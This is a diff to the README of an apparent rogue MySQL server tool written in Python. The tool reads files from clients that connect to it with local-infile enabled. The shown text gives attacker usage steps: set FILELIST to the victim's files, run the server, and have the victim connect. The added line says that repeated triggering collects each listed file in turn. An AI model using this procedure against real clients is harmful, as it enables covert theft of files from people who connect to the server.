@@ -5,6 +5,7 @@ Rogue MySql Server for Python3.x
 
 ## Step
 - Modify `FILELIST` of rogue_mysql_server.py to read the victim's file, modify `PORT` to modify the listening port
+- Continuous triggering will sequentially obtain the files in `FILELIST`
 - attacker exec `python rogue_mysql_server.py`
 - victim exec like `mysql.exe -h 127.0.0.1 -u root -p123 --enable-local-infile --ssl-mode=DISABLED`
 
